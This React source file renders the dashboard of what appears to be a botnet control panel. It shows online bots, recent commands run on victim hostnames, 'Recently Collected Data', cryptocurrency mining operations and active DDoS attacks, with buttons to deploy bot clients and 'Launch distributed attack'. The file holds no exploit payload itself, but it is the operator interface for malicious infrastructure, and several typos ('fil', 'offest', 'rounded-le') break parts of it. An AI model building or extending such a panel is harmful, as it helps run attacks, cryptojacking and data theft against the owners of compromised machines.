
import React, { useState, useEffect} from 'react'
import { motion } from 'framer-motion'
import {
    Bot, 
    Cpu, 
    Network,
    Shield,
    TrendingUp,
    Download,
    Play,
    StopCircle,
    AlertTriangle,
    Users,
    Zap,
    IndentDecrease
} from 'lucide-react'
import {
    LineChart , Line, BarChart, Bar, PieChart,  Pie, Cell, 
    ResponsiveContainer, AreaChart, Area
} from 'recharts'
import { useGSAP }  from '@gsap/react'
import gsap from 'gsap'
import { apiUtils, dashboardApi } from '../../utils/api'


const Dashboard = () => {
    const [dashboardData, setDashboardData] = useState({
        bots_stats: {},
        command_stats: {},
        mining_stats: {},
        ddos_stats: {},
        seo_stats: {},
        recent_commands: [],
        recent_data: []
    })
    const [isLoading, setIsLoading] = useState(true);
    const [lastUpdate, setLastUpdate] = useState(new Date());

    const fetchDashboardData = async () => {
        try {
            setIsLoading(true);
            const response = await dashboardApi.getOverview();
            setDashboardData(response.data);
            setLastUpdate(new Date())
        } catch (error) {
            console.error("Failed to fetch dashboard data: ", error);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        fetchDashboardData();
        const interval = setInterval(fetchDashboardData, 30000) //UPdate every 30 seconds
        return () => clearInterval(interval);
    }, []);

    useGSAP(() => {
        gsap.from('.stat-card', {
            y: 50,
            opacity: 0,
            stagger: 0.1,
            duration: 0.8,
            ease: 'power3.out'
        })
    });

    // sample chart data ( to replace with actual data from api)
    const botActivityData = [
        {time: '00:00', online: 15, active: 8},
        {time: '04:00', online: 12, active: 6},
        {time: '08:00', online: 18, active: 12},
        {time: '12:00', online: 22, active: 15},
        {time: '16:00', online: 20, active: 14},
        {time: '20:00', online: 16, active: 14},
    ];

    const commandDistributionData = [
        {name: 'System', value: 35, color: '#00c49f'},
        {name: 'Network', value: 25, color: '#0088fe'},
        {name: 'Data', value: 20, color: '#ffbb28'},
        {name: 'Special', value: 15, color: '#ff8042'},
        {name: 'SEO', value: 5, color: '#8884d8'},
    ];

    const StatCard = ({ icon: Icon, label, value, change, color, subtitle}) => (
        <motion.div
            whileHover={{ scale: 1.05}}
            className='stat-card bg-gray-800 rounded-xl p-6 border border-gray-700 hover:border-gray-500'
        >
            <div className="flex items-center justify-between">
                <div className="flex-1">
                    <p className="text-gray-400 text-sm mb-1">{label}</p>
                    <div className="flex items-baseline space-x-2">
                        <p className="text-3xl font-bold" style={{ color}}>
                            {isLoading ? "..." : value}
                        </p>
                        {change && (
                            <span className={`text-sm ${change > 0 ? 'text-green-500' : 'text-red-500'}`}>
                                {change > 0 ? '+' : ''}{change}%
                            </span>
                        )}
                    </div>
                    {(subtitle && ( 
                        <p className="text-gray-500 text-sm mt-1">{subtitle}</p>
                    ))}
                </div>
                <div className="p-3 rounded-full bg-gray-700">
                    <Icon size={24} color = {color}></Icon>
                </div>
            </div>
        </motion.div>
    );

    const QuickAction = ({ icon: Icon, title, description, onClick, color}) => (
        <motion.button
            whileHover={{ scale: 1.05}}
            whileTap={{ scale: 0.95}}
            onClick={onClick}
            className='p-4 bg-gray-800 rounded-xl border border-gray-700 text-left hover:border-cyan-500 transition-colors'
        >
            <div className="flex items-center space-x-3 mb-2">
                <div className="p-2 rounded-lg" style={{ backgroundColor: color + '20'}}>
                    <Icon size={20} style={{ color }}></Icon>
                </div>
                <h3 className="font-semibold" style={{ color }}>{title}</h3>
            </div>
            <p className="text-sm text-gray-400">{description}</p>
        </motion.button>
    )

  return (
    // <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 py-12">
        <div className="max-w-6xl mx-auto p-6 space-y-6">
            {/* Header */}
            <motion.div
                initial={{ opacity: 0, y: -20}}
                animate={{ opacity: 1, y: 0}}
                className='flex justify-between items-center'
            >
                <div>
                    <h1 className="text-3xl font-bold">Dashboard Overview</h1>
                    <p className="text-gray-400">
                        Last updated: {lastUpdate.toLocaleTimeString()}
                        {isLoading && '• Refreshing...'}
                    </p>
                </div>
                <div className="flex space-x-4">
                    <motion.button
                        whileHover={{ scale: 1.05}}
                        whileTap={{ scale: 0.95}}
                        onClick={fetchDashboardData}
                        className='px-4 bg-cyan-600 rounded-lg font-semibold flex items-center space-x-2'
                    >
                        <Play size={20}></Play>
                        <span>Refresh</span>
                    </motion.button>
                </div>
            </motion.div>

            {/* Quick action */}
            <motion.div
                initial={{ opacity: 0, x: -20}}
                animate={{ opacity: 1, x: 0}}
                className='grid grid-cols-1 md:grid-cols-1 lg:grid-cols-4 gap-4'
            >
                <QuickAction
                    icon={Bot}
                    title="Deploy Bot"
                    description="Diplot new bot client"
                    color='#00c49f'
                    onClick={() => window.location.href = '/delivery'}
                ></QuickAction>
                <QuickAction
                    icon={Zap}
                    title="Start Mining"
                    description="Begin cryptocurrency mining"
                    color="#ffbb28"
                    onClick={() => window.location.href = '/mining'}
                ></QuickAction>
                <QuickAction
                    icon={Network}
                    title="DDoS Attack"
                    description="Launch distributed attack"
                    color="#ff8042"
                    onClick={() => window.location.href = '/ddos'}
                ></QuickAction>
                <QuickAction
                    icon={TrendingUp}
                    title="SEO Campaign"
                    description="Boost search rankings"
                    color="#8884d8"
                    onClick={() => window.location.href = '/seo'}
                ></QuickAction>
                
            </motion.div>

            {/* Stat Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <StatCard
                    icon={Users}
                    label="Total Bots"
                    value={dashboardData.bots_stats?.total || 0}
                    change={5}
                    color="#00c49f"
                    subtitle={`${dashboardData.bots_stats?.online || 0 } online`}
                ></StatCard>
                <StatCard
                    icon={Cpu}
                    label="Active Operations"
                    value={dashboardData.mining_stats?.active_operations || 0}
                    change={2}
                    color="#0088fe"
                    subtitle={`${dashboardData.ddos_stats?.active_attacks || 0 } attacks`}
                ></StatCard>
                <StatCard
                    icon={Play}
                    label="Commands Executed"
                    value={dashboardData.command_stats?.completed || 0}
                    change={12}
                    color="#ffbb28"
                    subtitle={`${dashboardData.bots_stats?.pending || 0 } pending`}
                ></StatCard>
                <StatCard
                    icon={Download}
                    label="Data Collected"
                    value={dashboardData.seo_stats?.total_searches || 0}
                    change={8}
                    color="#ff8042"
                    subtitle="This Week"
                ></StatCard>
            </div>
            {/* charts section */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Bot activity chart */}
                <motion.div
                    initial={{ opacity: 0, x: -20}}
                    animate={{ opacity: 1, x: 0}}
                    className='bg-gray-800 rounded-xl p-6 border border-gray-700'
                >
                    <h3 className="text-lg font-semibold mb-4"> Bot Activity (24h)</h3>
                    <ResponsiveContainer width="100%" height={300}>
                        <AreaChart data={botActivityData}>
                            <defs>
                                <linearGradient id="onlineGradient" x1='0' y1="0" x2='0' y2='1'>
                                    <stop offset="5%" stopColor='#00c49f' stopOpacity={0.8}></stop>
                                    <stop offset='95%' stopColor='#00c49f' stopOpacity={0.1}></stop>
                                </linearGradient>
                                <linearGradient id='activeGradient' x1='0' y1='0' x2='0' y2='1'>
                                    <stop offset='5%' stopColor='#0088fe' stopOpacity={0.8}></stop>
                                    <stop offest='95%' stopColor='#0088fe' stopOpacity={0.1}></stop>
                                </linearGradient>
                            </defs>
                            <Area
                                type='monotone'
                                dataKey='online'
                                stroke='#00c49f'
                                fillOpacity={1}
                                fil="url(#onlineGradient)"
                                strokeWidth={2}
                            ></Area>
                            <Area
                                type='monotone'
                                dataKey='active'
                                stroke='#0088fe'
                                fillOpacity={1}
                                fil="url(#activeGradient)"
                                strokeWidth={2}
                            ></Area>                            
                        </AreaChart>
                    </ResponsiveContainer>
                    <div className="flex justify-center space-x-6 mt-4">
                        <div className="flex items-center space-x-2">
                            <div className="w-3 h-3 rounded-full bg-cyan-500"></div>
                            <span className="text-sm text-gray-400">Online Bots</span>
                        </div>
                        <div className="flex items-center space-x-2">
                            <div className="w-3 h-3 rounded-full bg-blue-500"></div>
                            <span className="text-sm text-gray-400">Active Operations</span>
                        </div>
                    </div>
                </motion.div>

                {/* command distribution */}
                <motion.div
                    initial={{ opacity: 0, x: 20}}
                    animate={{ opacity: 1, x: 0}}
                    className='bg-gray-800 rounded-xl p-6 border border-gray-700'
                >
                    <h3 className="text-lg font-semibold mb-4">Command Distribution</h3>
                    <ResponsiveContainer width='100%' height={300}>
                        <PieChart>
                            <Pie
                                data={commandDistributionData}
                                cx='50%'
                                cy='50%'
                                innerRadius={60}
                                outerRadius={100}
                                paddingAngle={2}
                                dataKey='value'
                                label={({name, percent}) => `${name} ${(percent * 100).toFixed(0)}%`}
                            >
                                {commandDistributionData.map((entry, index) => (
                                    <Cell key={`cell-${index}`} fill={entry.color}></Cell>
                                ))}
                            </Pie>
                        </PieChart>
                    </ResponsiveContainer>
                </motion.div>
            </div>

            {/* Recent activity */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Recent commands */}
                <motion.div
                    initial={{ opacity: 0, y: 20}}
                    animate={{ opacity: 1, y: 0}}
                    className='bg-gray-800 rounded-xl p-6 border border-gray-700'
                >
                    <h3 className="text-lg font-semibold mb-4">Recent Commands</h3>
                    <div className="space-y-3 max-h-80 overflow-y-auto">
                        {dashboardData.recent_commands?.map((command, index) => (
                            <motion.div
                                key={command.id}
                                initial={{ opacity: 0, x: -20}}
                                animate={{ opacity: 1, x: 0}}
                                className='flex items-center justify-between p-3 bg-gray-700 rounded-lg'
                            >
                                <div className="flex items-center space-x-3">
                                    <div className={`w-2 h-2 rounded-full ${
                                        command.status === 'completed' ? 'be-green-500' : 
                                        command.status === 'failed' ? 'bg-red-500' : 'bg-yellow-500'
                                    }`}></div>
                                    <div className="font-medium">{command.command_name}</div>
                                    <div className="text-sm text-gray-400">
                                        {command.bot_info?.hostname} • {apiUtils.formatCommandStatus(command.status)}
                                    </div>
                                </div>
                                <span className="text-gray-400 text-sm">
                                    {new Date(command.created_at).toLocaleTimeString()}
                                </span>
                            </motion.div>
                        ))}
                        {(!dashboardData.recent_commands || dashboardData.recent_commands.length === 0) && (
                            <div className="text-center text-gray-400 py-8">
                                <Play size={48} className='mx-auto mb-2 opacity-50'></Play>
                                <p>No recent commands</p>
                            </div>
                        )}
                    </div>
                </motion.div>

                {/* Recent data  */}
                <motion.div
                    initial={{ opacity: 0, y: 20}}
                    animate={{ opacity: 1, y: 0}}
                    className='bg-gray-800 rounded-xl p-6 border border-gray-700'
                >
                    <h3 className="text-lg font-semibold mb-4">Recently Collected Data</h3>
                    <div className="space-y-3 max-h-80 overflow-y-auto">
                        {dashboardData.recent_data?.map((data, index) => (
                            <motion.div
                                key={data.id}
                                initial={{opacity: 0, x:20}}
                                animate={{ opacity: 1, x: 0}}
                                transition={{ delay: index * 0.1}}
                                className='flex items-center justify-between p-3 bg-gray-700 rounded-lg'
                            >
                                <div className="flex items-center space-x-3">
                                    <Download size={16} className='text-cyan-500'></Download>
                                    <div>
                                        <div className="font-medium">{apiUtils.formatDataType(data.data_type)}</div>
                                        <div className="text-sm text-gray-400">
                                            {data.bot_info?.hostname} • {data.data_size_humanized}
                                        </div>
                                    </div>
                                </div>
                                <span className="text-gray-400 text-sm">
                                    {new Date(data.created_data).toLocaleTimeString()}
                                </span>
                            </motion.div>
                        ))}
                        {(!dashboardData.recent_data || dashboardData.recent_data.length === 0) && (
                            <div className="text-center text-gray-400 py-8">
                                <Download size={48} className='mx-auto mb-2 opacity-50'></Download>
                                <p>No data collected yet</p>
                            </div>
                        )}
                    </div>
                </motion.div>
            </div>

            {/* system status */}
            <motion.div
                initial={{ opacity: 0, y: 20}}
                animate={{ opacity: 1, y: 0}}
                className='bg-gray-800 rounded-xl p-6 border border-gray-700'
            >
                <h3 className="text-lg font-semibold mb-4">System Status</h3>
                <div className="grid grid-cols-2 md-grid-cols-4 gap-4">
                    <div className="text-center p-4 bg-gray-700 rounded-lg">
                        <div className="text-2xl font-bold text-green-500">
                            {dashboardData.bots_stats?.online || 0}
                        </div>
                        <div className="text-sm text-gray-400">Online Bots</div>
                    </div>
                    <div className="text-center p-4 bg-gray-700 rounded-lg">
                        <div className="text-2xl font-bold text-blue-500">
                            {dashboardData.mining_stats?.active_operations || 0}
                        </div>
                        <div className="text-sm text-gray-400">Mining Ops</div>
                    </div>
                    <div className="text-center p-4 bg-gray-700 rounded-lg">
                        <div className="text-2xl font-bold text-yellow-500">
                            {dashboardData.ddos_stats?.active_attacks || 0}
                        </div>
                        <div className="text-sm text-gray-400">Active Attacks </div>
                    </div>
                    <div className="text-center p-4 bg-gray-700 rounded-le">
                        <div className="text-2xl font-bold text-purple-500">
                            {dashboardData.seo_stats?.active_campaigns || 0}
                        </div>
                        <div className="text-sm text-gray-400">SEO Campaigns</div>
                    </div>                                        
                </div>
            </motion.div>
        </div>
    // </div>
  )
}

export default Dashboard